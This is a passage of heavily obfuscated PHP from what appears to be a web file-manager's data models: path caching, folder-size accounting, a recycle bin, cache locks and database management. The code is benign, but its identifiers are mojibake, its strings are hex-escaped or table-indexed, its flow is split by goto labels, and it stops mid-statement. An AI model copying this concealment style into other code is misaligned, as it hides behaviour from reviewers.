$this->sourceInfo($»†ÈèÏ¯); if (!$¢í’úæ) { return !1; } $¢í’úæ = $this->_listDataApplyItem($¢í’úæ, $Ôã­ÖüÙ); self::$cachePathInfo[$ïŞ—‰Æß] = $¢í’úæ; return $¢í’úæ; } public static $cachePathInfoMore = array(); public function pathInfoMore($éö™Óœå) { $»ùÖˆ¢É =& $_SERVER[É¨™èà]; $èĞºˆ¦è = _get(self::$cachePathInfoMore, $éö™Óœå); if ($èĞºˆ¦è) { return $èĞºˆ¦è; } $‰—üÜ¦Ä = $this->pathInfo($éö™Óœå); if (!$‰—üÜ¦Ä) { return !1; } if ($‰—üÜ¦Ä[$»ùÖˆ¢É[495]] == $»ùÖˆ¢É[91]) { $‰—üÜ¦Ä[$»ùÖˆ¢É[82]] = $this->folderChildrenNumber($éö™Óœå); } self::$cachePathInfoMore[$éö™Óœå] = $‰—üÜ¦Ä; return $‰—üÜ¦Ä; } public function sourceInfo($ËÒ×÷Íû) { $„şÈÖ¡­ =& $_SERVER[É¨™èà]; if (!$ËÒ×÷Íû) { return array(); } $ËÒ×÷Íû = intval($ËÒ×÷Íû); $‰‡ê”Î… = $„şÈÖ¡­[543] . $ËÒ×÷Íû; $Áıêî›‚ = _get(self::$cacheSourceInfo, $‰‡ê”Î…); if ($Áıêî›‚) { return $Áıêî›‚; } $®Ÿ¾ä¸» = $this->where(array($„şÈÖ¡­[194] => $ËÒ×÷Íû))->find(); self::$cacheSourceInfo[$‰‡ê”Î…] = $®Ÿ¾ä¸»; return self::$cacheSourceInfo[$‰‡ê”Î…]; } public function sourceCacheClear($’Ö¿¨× = false) { self::cacheClear($’Ö¿¨×); } public static function cacheClear($ ÇÑÁë¡ = false) { $²Ìş‡÷ó =& $_SERVER[É¨™èà]; if ($ ÇÑÁë¡ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$²Ìş‡÷ó[543] . $ ÇÑÁë¡]); unset(self::$cachePathInfoMore[$ ÇÑÁë¡]); unset(self::$cachePathInfo[$²Ìş‡÷ó[2320] . $ ÇÑÁë¡]); unset(self::$cachePathInfo[$²Ìş‡÷ó[2321] . $ ÇÑÁë¡]); } public function metaSet($ÙÕÙãÁ, $˜È‡°­Ÿ = null, $ø÷ªã€ = null) { $í†Ô‚É™ = parent::metaSet($ÙÕÙãÁ, $˜È‡°­Ÿ, $ø÷ªã€); if ($í†Ô‚É™) { $this->sourceCacheClear($ÙÕÙãÁ); } return $í†Ô‚É™; } public function pathInfoByPath($Èò«³Æê, $°§îèŞ¢) { $‘™ˆö–½ =& $_SERVER[É¨™èà]; $üı²Ï²™ = !$°§îèŞ¢ ? array() : explode($‘™ˆö–½[8], trim($°§îèŞ¢, $‘™ˆö–½[8])); $À°×ÜÜ” = $Èò«³Æê; foreach ($üı²Ï²™ as $ ®“ºÇĞ) { $ØÀ«ÛîÊ = array($‘™ˆö–½[193] => $À°×ÜÜ”, $‘™ˆö–½[32] => $ ®“ºÇĞ); $ª‹£Œ§Ü = $this->field($‘™ˆö–½[2322])->where($ØÀ«ÛîÊ)->select(); if (!$ª‹£Œ§Ü) { return !1; } $ª‹£Œ§Ü = array_sort_by($ª‹£Œ§Ü, $‘™ˆö–½[515]); $À°×ÜÜ” = $ª‹£Œ§Ü[0][$‘™ˆö–½[194]]; } $£İâî¡£ = $this->sourceInfo($À°×ÜÜ”); $this->pathInfoFilter($£İâî¡£); return $£İâî¡£; } protected function updateModifyTime($ì¾«´•×) { $¤Ğ‹öâ =& $_SERVER[É¨™èà]; $ˆ†ƒ½ğ = defined($¤Ğ‹öâ[2230]) ? USER_ID : 0; if (!$ì¾«´•×) { return; } if (!is_array($ì¾«´•×)) { $ì¾«´•× = array($ì¾«´•×); } foreach ($ì¾«´•× as $İÏÍş¨ => $ĞÅ©ñÌ‚) { $ì¾«´•×[$İÏÍş¨] = intval($ĞÅ©ñÌ‚); $this->sourceCacheClear($ĞÅ©ñÌ‚); } $Â‹ÔÔî« = array($¤Ğ‹öâ[194] => array($¤Ğ‹öâ[7], $ì¾«´•×)); $´«¹å = array($¤Ğ‹öâ[666] => $ˆ†ƒ½ğ, $¤Ğ‹öâ[508] => time()); $this->where($Â‹ÔÔî«)->save($´«¹å); } public function folderSizeReset($†Üä—¹Á, $¤§ÚÄÉŒ = false) { $½òê„Êâ =& $_SERVER[É¨™èà]; if ($this->statusIgnoreResetSpace) { return; } $€à–÷ç = $this->sourceInfo($†Üä—¹Á); $ŒşÅ©İø = $½òê„Êâ[2323] . $†Üä—¹Á; CacheLock::lock($ŒşÅ©İø, 20); if ($¤§ÚÄÉŒ === !1) { $this->sourceCacheClear($†Üä—¹Á); $€à–÷ç = $this->sourceInfo($†Üä—¹Á); $Šõş†’© = array($½òê„Êâ[487] => $†Üä—¹Á, $½òê„Êâ[514] => 0); $ªÖ³¦á‡ = $this->where($Šõş†’©)->sum($½òê„Êâ[79]); $¤§ÚÄÉŒ = intval($ªÖ³¦á‡) - intval($€à–÷ç[$½òê„Êâ[79]]); } if ($¤§ÚÄÉŒ == 0) { return CacheLock::unlock($ŒşÅ©İø); } $ú®ù‹ß = $this->parentLevelArray($€à–÷ç[$½òê„Êâ[596]]); if (!$ú®ù‹ß) { $ú®ù‹ß = array(); } $ú®ù‹ß[] = $€à–÷ç[$½òê„Êâ[194]]; $Šõş†’© = array($½òê„Êâ[194] => array($½òê„Êâ[502], $ú®ù‹ß)); if ($¤§ÚÄÉŒ < 0) { $Šõş†’©[$½òê„Êâ[79]] = array($½òê„Êâ[1109], abs($¤§ÚÄÉŒ)); } $this->where($Šõş†’©)->setAdd($½òê„Êâ[79], $¤§ÚÄÉŒ); CacheLock::unlock($ŒşÅ©İø); $ïÃÏ‘²¾ = $½òê„Êâ[2324] . $€à–÷ç[$½òê„Êâ[191]] . $½òê„Êâ[4] . $€à–÷ç[$½òê„Êâ[581]]; $„¤Ã§ë = array($€à–÷ç[$½òê„Êâ[191]], $€à–÷ç[$½òê„Êâ[581]]); TaskRun::timeLimitCall($ïÃÏ‘²¾, $½òê„Êâ[2325], $„¤Ã§ë, 1.5); } public function folderSizeResetChildren($şœ¨çÄ…) { $„¶¯‡¸ =& $_SERVER[É¨™èà]; $this->sourceCacheClear($şœ¨çÄ…); $¤ˆ‚‘® = $this->sourceInfo($şœ¨çÄ…); $Å¶û´Í = array($„¶¯‡¸[661] => 1, $„¶¯‡¸[664] => $¤ˆ‚‘®[$„¶¯‡¸[581]], $„¶¯‡¸[667] => array($„¶¯‡¸[627], $¤ˆ‚‘®[$„¶¯‡¸[596]] . $şœ¨çÄ… . $„¶¯‡¸[628])); $–şéÃ¬Ğ = $„¶¯‡¸[2326]; $ôÜĞ‰ ª = $this->field($–şéÃ¬Ğ)->where($Å¶û´Í)->select(); $Å¶û´Í[$„¶¯‡¸[495]] = 0; $Ò™¼ÒÒ = $this->field($–şéÃ¬Ğ)->where($Å¶û´Í)->select(); if (!$Ò™¼ÒÒ) { return; } $ôÜĞ‰ ª[] = $¤ˆ‚‘®; $ôÜĞ‰ ª = array_to_keyvalue($ôÜĞ‰ ª, $„¶¯‡¸[194]); foreach ($ôÜĞ‰ ª as $æ¥¤ô”¶ => $ç™ÅºÃâ) { $ôÜĞ‰ ª[$æ¥¤ô”¶][$„¶¯‡¸[2327]] = $ôÜĞ‰ ª[$æ¥¤ô”¶][$„¶¯‡¸[79]]; $ôÜĞ‰ ª[$æ¥¤ô”¶][$„¶¯‡¸[79]] = 0; } foreach ($Ò™¼ÒÒ as $ç™ÅºÃâ) { $ÜÈ¾Œ = $ç™ÅºÃâ[$„¶¯‡¸[193]] . $„¶¯‡¸[12]; if (!isset($ôÜĞ‰ ª[$ÜÈ¾Œ])) { continue; } if ($ç™ÅºÃâ[$„¶¯‡¸[515]] == $ôÜĞ‰ ª[$ÜÈ¾Œ][$„¶¯‡¸[515]]) { $ôÜĞ‰ ª[$ÜÈ¾Œ][$„¶¯‡¸[79]] += $ç™ÅºÃâ[$„¶¯‡¸[79]]; } } foreach ($ôÜĞ‰ ª as $ç™ÅºÃâ) { $ˆÃöö™À = $this->parentLevelArray($ç™ÅºÃâ[$„¶¯‡¸[596]]); foreach ($ˆÃöö™À as $ÜÈ¾Œ) { $ÜÈ¾Œ = $ÜÈ¾Œ . $„¶¯‡¸[12]; if (!isset($ôÜĞ‰ ª[$ÜÈ¾Œ])) { continue; } if ($ç™ÅºÃâ[$„¶¯‡¸[515]] == $ôÜĞ‰ ª[$ÜÈ¾Œ][$„¶¯‡¸[515]]) { $ôÜĞ‰ ª[$ÜÈ¾Œ][$„¶¯‡¸[79]] += $ç™ÅºÃâ[$„¶¯‡¸[79]]; } } } $¯ìÈé’® = array(); foreach ($ôÜĞ‰ ª as $ç™ÅºÃâ) { if ($ç™ÅºÃâ[$„¶¯‡¸[79]] == $ç™ÅºÃâ[$„¶¯‡¸[2327]]) { continue; } $¯ìÈé’®[] = array($„¶¯‡¸[194], $ç™ÅºÃâ[$„¶¯‡¸[194]], $„¶¯‡¸[79], $ç™ÅºÃâ[$„¶¯‡¸[79]]); } $this->saveAll($¯ìÈé’®); } public function userSpaceReset($îâéÖÉ = false) { $ä¾œÍí· =& $_SERVER[É¨™èà]; $Ú£ÃÈ‚’ = $this->where(array($ä¾œÍí·[191] => self::TYPE_USER, $ä¾œÍí·[581] => $îâéÖÉ, $ä¾œÍí·[495] => 0))->sum($ä¾œÍí·[79]); $Ú£ÃÈ‚’ = !$Ú£ÃÈ‚’ || $Ú£ÃÈ‚’ <= 0 ? 0 : $Ú£ÃÈ‚’; Model($ä¾œÍí·[589])->userEdit($îâéÖÉ, array($ä¾œÍí·[1988] => $Ú£ÃÈ‚’)); } public function targetSpaceUpdate($°–€õ›İ, $²—µÃ¦’) { $Ì±Óµ¼ =& $_SERVER[É¨™èà]; if (!$²—µÃ¦’) { return; } if (!in_array($°–€õ›İ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $öşî”Èé = $this->targetSpaceSize($°–€õ›İ, $²—µÃ¦’); if ($°–€õ›İ == self::TYPE_USER) { Model($Ì±Óµ¼[589])->userEdit($²—µÃ¦’, array($Ì±Óµ¼[1988] => $öşî”Èé)); } else { if ($°–€õ›İ == self::TYPE_GROUP) { Model($Ì±Óµ¼[597])->groupEdit($²—µÃ¦’, array($Ì±Óµ¼[1988] => $öşî”Èé)); } } } public function targetSpaceSize($´…Ì÷ıœ, $’à¿°ºŞ) { $¦›ñäúß =& $_SERVER[É¨™èà]; $ø±äî› = 0; $²²ÜÓ è = $this->targetSourceRoot($´…Ì÷ıœ, $’à¿°ºŞ, !0); foreach ($²²ÜÓ è as $’°¬“½¿) { if (!$’°¬“½¿) { continue; } $ø±äî› += floatval($’°¬“½¿[$¦›ñäúß[79]]); $ËÍıçß« = array($¦›ñäúß[667] => array($¦›ñäúß[627], $¦›ñäúß[605] . $’°¬“½¿[$¦›ñäúß[194]] . $¦›ñäúß[628])); $»èÂ˜·Ï = Model($¦›ñäúß[513])->field($¦›ñäúß[501])->where($ËÍıçß«)->select(); $»èÂ˜·Ï = array_to_keyvalue($»èÂ˜·Ï, $¦›ñäúß[12], $¦›ñäúß[194]); $»èÂ˜·Ï = array_unique(array_filter($»èÂ˜·Ï)); if ($»èÂ˜·Ï) { $ËÍıçß« = array($¦›ñäúß[501] => array($¦›ñäúß[502], $»èÂ˜·Ï)); $ø±äî› += floatval($this->where($ËÍıçß«)->sum($¦›ñäúß[79])); } } $ø±äî› = !$ø±äî› || $ø±äî› <= 0 ? 0 : $ø±äî›; return $ø±äî›; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ËóíË‘Œ) { return $this->fileTypeProfile($ËóíË‘Œ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Ê¿ÌÜùŒ) { return $this->fileTypeProfile($Ê¿ÌÜùŒ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($€×ôé¦É, $•Óİ§À) { $â«ÕøÚ¦ =& $_SERVER[É¨™èà]; $é‚„Û‰ó = $â«ÕøÚ¦[2328] . $€×ôé¦É . $â«ÕøÚ¦[11] . $•Óİ§À; $Ğç²Óäã = Cache::get($é‚„Û‰ó); if ($Ğç²Óäã) { return $Ğç²Óäã; } $î¥Ö‡›† = array($â«ÕøÚ¦[661] => 0); if ($€×ôé¦É != !1) { $î¥Ö‡›†[$â«ÕøÚ¦[581]] = $€×ôé¦É; $î¥Ö‡›†[$â«ÕøÚ¦[191]] = $•Óİ§À; } $¿“¶ãá = array(); $¿“¶ãá[$â«ÕøÚ¦[2329]] = array($â«ÕøÚ¦[2330] => LNG($â«ÕøÚ¦[2329]), $â«ÕøÚ¦[2331] => $this->where($î¥Ö‡›†)->count(), $â«ÕøÚ¦[632] => $this->where($î¥Ö‡›†)->sum($â«ÕøÚ¦[79])); $†ÚÂ»¾ = KodIO::fileTypeList(); foreach ($†ÚÂ»¾ as $®»µ²š => $æÖŒ‘áÇ) { $î¥Ö‡›†[$â«ÕøÚ¦[496]] = $this->fileTypeWhere($®»µ²š); $¿“¶ãá[$®»µ²š] = array($â«ÕøÚ¦[2330] => $æÖŒ‘áÇ[$â«ÕøÚ¦[32]], $â«ÕøÚ¦[2331] => $this->where($î¥Ö‡›†)->count(), $â«ÕøÚ¦[632] => $this->where($î¥Ö‡›†)->sum($â«ÕøÚ¦[79])); } Cache::set($é‚„Û‰ó, $¿“¶ãá, 1200); return $¿“¶ãá; } public function fileNameExist($á£ä½‚¤, $ÍµÜÙÙï) { $·Íø©¨Œ =& $_SERVER[É¨™èà]; $Ö»Ï§›˜ = $this->field($·Íø©¨Œ[2332])->where(array($·Íø©¨Œ[193] => $á£ä½‚¤, $·Íø©¨Œ[32] => $ÍµÜÙÙï, $·Íø©¨Œ[515] => 0))->find(); return is_array($Ö»Ï§›˜) ? $Ö»Ï§›˜[$·Íø©¨Œ[194]] : !1; } public function childList($Êİùáòí) { $“Æà¾êø =& $_SERVER[É¨™èà]; $„á’¶¡¾ = $“Æà¾êø[2305] . $Êİùáòí; if (isset(self::$cacheChildList[$„á’¶¡¾])) { return self::$cacheChildList[$„á’¶¡¾]; } $ø—ÃÆ§á = array($“Æà¾êø[193] => intval($Êİùáòí), $“Æà¾êø[515] => 0); $¢öä¢´× = $this->where($ø—ÃÆ§á)->select(); $¢öä¢´× = $¢öä¢´× ? $¢öä¢´× : array(); self::$cacheChildList[$„á’¶¡¾] = $¢öä¢´×; foreach ($¢öä¢´× as $ÑÂÃˆ¤£) { $„á’¶¡¾ = $“Æà¾êø[543] . $ÑÂÃˆ¤£[$“Æà¾êø[194]]; self::$cacheSourceInfo[$„á’¶¡¾] = $ÑÂÃˆ¤£; } return $¢öä¢´×; } public function fileNameAuto($ªş· úû, $¢Ÿô…™, $îŸ¶·® = REPEAT_RENAME, $”üŸ›¥ê = false) { $¢Ş¢èôø =& $_SERVER[É¨™èà]; $è¾àí· = get_path_ext($¢Ÿô…™); $¾óŞñ¯ß = $è¾àí· ? get_path_ext_name($¢Ÿô…™) . $¢Ş¢èôø[2333] . $è¾àí· : $¢Ÿô…™ . $¢Ş¢èôø[470]; $È‹§ à« = array($¢Ş¢èôø[193] => $ªş· úû, $¢Ş¢èôø[515] => 0, $¢Ş¢èôø[32] => array($¢Ş¢èôø[469], $¾óŞñ¯ß)); $ï°ÇåáÁ = $this->field($¢Ş¢èôø[32])->where($È‹§ à«)->select(); $§­ƒø¿‘ = array_to_keyvalue($ï°ÇåáÁ, $¢Ş¢èôø[12], $¢Ş¢èôø[32]); return $this->fileNameAutoGet($§­ƒø¿‘, $¢Ÿô…™, $îŸ¶·®, $”üŸ›¥ê); } public function fileNameAutoGet($ÛËµ‹°ï, $’¶èåİ±, $Ëö¶ôÛŞ, $û¬‰Ä) { $‹äÌ‚è =& $_SERVER[É¨™èà]; if ($Ëö¶ôÛŞ == REPEAT_REPLACE || !$ÛËµ‹°ï || !in_array_not_case($’¶èåİ±, $ÛËµ‹°ï) || $û¬‰Ä && $Ëö¶ôÛŞ != REPEAT_RENAME_FOLDER) { return $’¶èåİ±; } if ($Ëö¶ôÛŞ == REPEAT_SKIP) { return !1; } $‰×¹ûš­ = $‹äÌ‚è[10] . get_path_ext($’¶èåİ±); $‰×¹ûš­ = $‰×¹ûš­ == $‹äÌ‚è[10] || $û¬‰Ä ? $‹äÌ‚è[12] : $‰×¹ûš­; for ($÷ÛÀ×ÖŒ = 1; $÷ÛÀ×ÖŒ <= count($ÛËµ‹°ï) + 1; $÷ÛÀ×ÖŒ++) { $ÛéµŸ”– = substr($’¶èåİ±, 0, strlen($’¶èåİ±) - strlen($‰×¹ûš­)); $İÏùÓ¿â = $ÛéµŸ”– . "\50{$÷ÛÀ×ÖŒ}\51{$‰×¹ûš­}"; if (!in_array_not_case($İÏùÓ¿â, $ÛËµ‹°ï)) { return $İÏùÓ¿â; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\137\163\x6f\165\162\x63\145\137\x72\145\x63\x79\x63\154\x65"; protected $dataAuto = array(array("\x63\162\x65\141\164\x65\x54\x69\x6d\x65", "\164\151\x6d\145", "\x69\x6e\x73\145\162\x74", "\x66\165\x6e\143\x74\151\x6f\x6e")); public function listData($ûƒÒ‡İÄ = false) { $™˜… =& $_SERVER[É¨™èà]; $ûƒÒ‡İÄ = $ûƒÒ‡İÄ ? $ûƒÒ‡İÄ : USER_ID; $ò­°…ô = $this->where(array($™˜…[1791] => $ûƒÒ‡İÄ))->select(); return array_to_keyvalue($ò­°…ô, $™˜…[12], $™˜…[194]); } public function moveToRecycle($Ù»Úû’) { $¶•–Â±Ë =& $_SERVER[É¨™èà]; $î¼ÂÕæ = Model($¶•–Â±Ë[1448]); $ñœï­á¹ = $î¼ÂÕæ->sourceInfo($Ù»Úû’); if (!$ñœï­á¹ || $ñœï­á¹[$¶•–Â±Ë[515]] == $¶•–Â±Ë[91]) { return; } $¶°£­¤ = array($¶•–Â±Ë[501] => $Ù»Úû’, $¶•–Â±Ë[1791] => USER_ID, $¶•–Â±Ë[663] => $ñœï­á¹[$¶•–Â±Ë[191]], $¶•–Â±Ë[664] => $ñœï­á¹[$¶•–Â±Ë[581]], $¶•–Â±Ë[667] => $ñœï­á¹[$¶•–Â±Ë[596]]); $this->add($¶°£­¤); $this->recycleMove($Ù»Úû’, 1); if ($ñœï­á¹[$¶•–Â±Ë[495]] == $¶•–Â±Ë[91]) { $Â¶¶–‘“ = array($¶•–Â±Ë[667] => array($¶•–Â±Ë[627], $ñœï­á¹[$¶•–Â±Ë[596]] . $Ù»Úû’ . $¶•–Â±Ë[628])); $î¼ÂÕæ->where($Â¶¶–‘“)->setField($¶•–Â±Ë[515], 1); } } public function clear() { $this->remove(!1); } public function remove($‘ı¬¿é = false, $—”ñü· = false) { $ã¢õú =& $_SERVER[É¨™èà]; $—”ñü· = $—”ñü· ? $—”ñü· : USER_ID; $éãí™‘ = Model($ã¢õú[1448]); $ãóâøİÆ = $this->listData($—”ñü·); $‘ı¬¿é = $‘ı¬¿é === !1 ? !1 : $‘ı¬¿é; $½úµæŒ = array(); foreach ($ãóâøİÆ as $ñ©âåß) { if ($‘ı¬¿é != !1 && !in_array($ñ©âåß, $‘ı¬¿é)) { continue; } $°ôà”ÅŒ = $éãí™‘->sourceInfo($ñ©âåß); $éãí™‘->remove($ñ©âåß, !1); $ïº¥È‡¦ = $°ôà”ÅŒ[$ã¢õú[191]] . $ã¢õú[11] . $°ôà”ÅŒ[$ã¢õú[581]]; $½úµæŒ[$ïº¥È‡¦] = array($ã¢õú[663] => $°ôà”ÅŒ[$ã¢õú[191]], $ã¢õú[581] => $°ôà”ÅŒ[$ã¢õú[581]]); $this->where(array($ã¢õú[194] => $ñ©âåß))->delete(); } foreach ($½úµæŒ as $—ìˆ‡»£) { $éãí™‘->targetSpaceUpdate($—ìˆ‡»£[$ã¢õú[191]], $—ìˆ‡»£[$ã¢õú[581]]); } } public function restore($Üïâó¹ş = false) { $ûš¬‰ = $this->listData(); $this->_restoreSource($ûš¬‰, $Üïâó¹ş); } public function removeUserAll($Âœ¯¥¥¬) { $this->remove(!1, $Âœ¯¥¥¬); } public function restoreItem($áœÕ¿Ø·) { $this->_restoreSource(array($áœÕ¿Ø·), array($áœÕ¿Ø·)); } private function _restoreSource($§¯×¢«, $£í¯™§û) { $­¤¡Ì’¯ =& $_SERVER[É¨™èà]; $±ù•¤ƒ = Model($­¤¡Ì’¯[1448]); $£í¯™§û = $£í¯™§û == !1 ? !1 : $£í¯™§û; if (!$§¯×¢«) { return !0; } $éé¾ ¼ = array(); foreach ($§¯×¢« as $ÛÕ ñ­Ê) { if ($£í¯™§û != !1 && !in_array($ÛÕ ñ­Ê, $£í¯™§û)) { continue; } $åµˆ¡Ã = $±ù•¤ƒ->sourceInfo($ÛÕ ñ­Ê); $âŸ¨ê‘Å = $±ù•¤ƒ->sourceInfo($åµˆ¡Ã[$­¤¡Ì’¯[193]]); if ($âŸ¨ê‘Å[$­¤¡Ì’¯[515]] == $­¤¡Ì’¯[91]) { continue; } $±ù•¤ƒ->lockMoveStart($ÛÕ ñ­Ê); $this->recycleMove($ÛÕ ñ­Ê, 0); if ($åµˆ¡Ã[$­¤¡Ì’¯[495]] == $­¤¡Ì’¯[91]) { $‘ô°óÙÄ = array($­¤¡Ì’¯[667] => array($­¤¡Ì’¯[627], $åµˆ¡Ã[$­¤¡Ì’¯[596]] . $ÛÕ ñ­Ê . $­¤¡Ì’¯[628])); $±ù•¤ƒ->where($‘ô°óÙÄ)->setField($­¤¡Ì’¯[515], 0); $this->restoreFolderChildren($ÛÕ ñ­Ê, $§¯×¢«); } $this->where(array($­¤¡Ì’¯[194] => $ÛÕ ñ­Ê))->delete(); $±ù•¤ƒ->folderSizeReset($åµˆ¡Ã[$­¤¡Ì’¯[193]]); $éé¾ ¼[] = $åµˆ¡Ã[$­¤¡Ì’¯[193]]; if ($åµˆ¡Ã[$­¤¡Ì’¯[495]] == $­¤¡Ì’¯[91]) { $éé¾ ¼[] = $ÛÕ ñ­Ê; } $±ù•¤ƒ->lockMoveEnd($ÛÕ ñ­Ê); } $±ù•¤ƒ->updateModifyTime($éé¾ ¼); } private function restoreFolderChildren($Å¶åäà€, $ñíÜ‘ø†) { $ûéü¹Åù =& $_SERVER[É¨™èà]; $­€™¨šÜ = Model($ûéü¹Åù[1448]); $šÏ¹ÃŸÇ = array($ûéü¹Åù[194] => array($ûéü¹Åù[7], array())); foreach ($ñíÜ‘ø† as $ìö•‚‰) { if ($ìö•‚‰ == $Å¶åäà€) { continue; } if (!$­€™¨šÜ->isParentOf($Å¶åäà€, $ìö•‚‰)) { continue; } $‹éÊİ­Ç = $­€™¨šÜ->sourceInfo($ìö•‚‰); if ($‹éÊİ­Ç[$ûéü¹Åù[495]] == $ûéü¹Åù[91]) { $šÏ¹ÃŸÇ[] = array($ûéü¹Åù[667] => array($ûéü¹Åù[627], $‹éÊİ­Ç[$ûéü¹Åù[596]] . $ìö•‚‰ . $ûéü¹Åù[628])); } else { $šÏ¹ÃŸÇ[$ûéü¹Åù[194]][1][] = $ìö•‚‰; } } if (!$šÏ¹ÃŸÇ[$ûéü¹Åù[194]][1]) { unset($šÏ¹ÃŸÇ[$ûéü¹Åù[194]]); } if (!$šÏ¹ÃŸÇ) { return; } if (is_array($šÏ¹ÃŸÇ[$ûéü¹Åù[194]]) && is_array($šÏ¹ÃŸÇ[$ûéü¹Åù[194]][1])) { $šÏ¹ÃŸÇ[$ûéü¹Åù[194]][1] = array_unique($šÏ¹ÃŸÇ[$ûéü¹Åù[194]][1]); } $šÏ¹ÃŸÇ[$ûéü¹Åù[1094]] = $ûéü¹Åù[2102]; $­€™¨šÜ->where($šÏ¹ÃŸÇ)->setField($ûéü¹Åù[515], 1); } private function recycleMove($Ş“·ØÏä, $ŞÄ¤ÎŒô = 1) { $†®İõõ =& $_SERVER[É¨™èà]; $ÆÁ éÆß = Model($†®İõõ[1448]); $ÙïÖÁŠ = Model($†®İõõ[2334]); $¦äÆ„ĞŒ = array($†®İõõ[194] => $Ş“·ØÏä); if ($ŞÄ¤ÎŒô) { $ÆÁ éÆß->where($¦äÆ„ĞŒ)->setField($†®İõõ[515], 1); $ÙïÖÁŠ->eventRecycle($Ş“·ØÏä, $†®İõõ[2335]); } else { $¹İ§÷ò’ = $ÆÁ éÆß->where($¦äÆ„ĞŒ)->find(); $½¹ßª® = $¹İ§÷ò’[$†®İõõ[495]] == $†®İõõ[91]; $±øÏÒóÈ = $ÆÁ éÆß->fileNameAuto($¹İ§÷ò’[$†®İõõ[193]], $¹İ§÷ò’[$†®İõõ[32]], REPEAT_RENAME_FOLDER, $½¹ßª®); if ($±øÏÒóÈ != $¹İ§÷ò’[$†®İõõ[32]]) { $ÆÁ éÆß->rename($Ş“·ØÏä, $±øÏÒóÈ); } $ÆÁ éÆß->where($¦äÆ„ĞŒ)->setField($†®İõõ[515], 0); $ÙïÖÁŠ->eventRecycle($Ş“·ØÏä, $†®İõõ[2336]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\155\x2e\x73\x6f\x75\162\x63\145\x53\x65\143\x72\145\164\x4c\151\163\x74"; public $field = array("\x73\157\x75\x72\143\145\x49\x44", "\164\x79\x70\x65\x49\104", "\143\x72\x65\141\x74\x65\x55\163\145\162"); } goto Eß£’Ñç•Â; B÷óîîÉ›ğ: class CacheLockRedis { public function lock($”Â÷ÒÎ­, $Ô¼ğŞ‰· = 10) { $”†öŞÔ = Cache::init(); $¦Ëç— = microtime(!0) + $Ô¼ğŞ‰·; while (microtime(!0) < $¦Ëç—) { $ËÌ™Ïî¯ = $”†öŞÔ->get($”Â÷ÒÎ­); if (!$ËÌ™Ïî¯) { $”©Šèª = $”†öŞÔ->setLock($”Â÷ÒÎ­, $¦Ëç—, $Ô¼ğŞ‰·); if ($”©Šèª) { return !0; } } else { if ($ËÌ™Ïî¯ < microtime(!0)) { $”†öŞÔ->set($”Â÷ÒÎ­, $¦Ëç—, $Ô¼ğŞ‰· * 2); if ($”†öŞÔ->get($”Â÷ÒÎ­) === $ËÌ™Ïî¯) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($¸”³’æ™) { return Cache::init()->get($¸”³’æ™); } public function unlock($Ûú„¡á) { return Cache::init()->remove($Ûú„¡á); } } class CacheLockMemcached { public function lock($¦Ôä„¨ı, $ş·ğá¶Õ = 0) { $¥Èã¥œ = Cache::init(); $ÛÈÓªµ = microtime(!0) + $ş·ğá¶Õ; while (microtime(!0) < $ÛÈÓªµ) { $íúçÀÎá = $¥Èã¥œ->get($¦Ôä„¨ı); if (!$íúçÀÎá || $íúçÀÎá < microtime(!0)) { $öË³ÎÙÃ = $¥Èã¥œ->handle->add($¦Ôä„¨ı, $ÛÈÓªµ, $ş·ğá¶Õ); if ($öË³ÎÙÃ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($èíá£›ó) { return Cache::init()->get($èíá£›ó); } public function unlock($Ÿğ¾Œ¤) { return Cache::init()->remove($Ÿğ¾Œ¤); } } class CacheLockDatabase { public function lock($Øíšæ«•, $ƒú°ñ™œ = 0) { $õŞÆŠ‡ = Model($_SERVER[É¨™èà][925]); $±¹§ôÜ = microtime(!0) + $ƒú°ñ™œ; while (microtime(!0) < $±¹§ôÜ) { $ŒşÓªèâ = $õŞÆŠ‡->get($Øíšæ«•); if (!$ŒşÓªèâ || $ŒşÓªèâ < microtime(!0)) { $ùÍºêøÙ = $õŞÆŠ‡->set($Øíšæ«•, $±¹§ôÜ); if ($ùÍºêøÙ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($³ ñƒôŸ) { return Model($_SERVER[É¨™èà][925])->get($³ ñƒôŸ); } public function unlock($ö§’ÛØ) { Model($_SERVER[É¨™èà][925])->remove($ö§’ÛØ); } } goto D­„‚Òœ‘º; A‘íëÛ”ÓÂ: class DbManage { function __construct($‡ƒØ¨Î± = array()) { $¿¥Ã—Üá =& $_SERVER[É¨™èà]; if (empty($‡ƒØ¨Î±)) { $‡ƒØ¨Î± = $GLOBALS[$¿¥Ã—Üá[6]][$¿¥Ã—Üá[21]]; } $this->database = $‡ƒØ¨Î±; } public function model($˜îèÖåµ = '') { return new ModelBase($˜îèÖåµ, $_SERVER[É¨™èà][12], $this->database); } public function db($Îì‰Ñê = false) { $Ñ»Ñ³É® =& $_SERVER[É¨™èà]; $ ßÚĞÉş = array_change_key_case($this->database); if ($this->dbType() == $Ñ»Ñ³É®[13] || !$Îì‰Ñê) { return $this->model()->db(); } $Èß¦ìŞÕ = $ ßÚĞÉş[$Ñ»Ñ³É®[1066]]; $ ßÚĞÉş[$Ñ»Ñ³É®[1066]] = $Ñ»Ñ³É®[12]; if ($ ßÚĞÉş[$Ñ»Ñ³É®[1061]] == $Ñ»Ñ³É®[1058]) { $‡˜˜¿®Í = $ ßÚĞÉş[$Ñ»Ñ³É®[1067]]; $ ßÚĞÉş[$Ñ»Ñ³É®[1067]] = substr($‡˜˜¿®Í, 0, strrpos($‡˜˜¿®Í, $Ñ»Ñ³É®[1153])); } $this->database = $ ßÚĞÉş; $„ÃãÚ¢  = $this->model()->db(); try { $¢ãéºş = $„ÃãÚ¢ ->execute("\163\150\x6f\167\40\144\141\x74\x61\142\141\x73\145\163\x20\154\x69\x6b\x65\x20\x27{$Èß¦ìŞÕ}\x27"); } catch (Exception $Šá¹°²›) { } if (!$¢ãéºş) { $„ÃãÚ¢ 